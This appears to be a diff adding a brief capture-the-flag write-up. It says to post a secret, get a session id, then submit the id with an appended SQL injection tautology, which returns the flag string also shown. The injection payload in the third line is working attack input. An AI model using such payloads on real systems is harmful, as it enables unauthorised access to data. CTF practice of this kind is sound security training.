@@ -1,0 +1,6 @@
+Pretty simple, we just need to post a secret, get a valid session-id
+then
+b1349dffb651ea51214fa754b1017eb6' OR ''='
+
+and we get:
+FLAG-8a94da5963c1634274dcaad6f4c09349
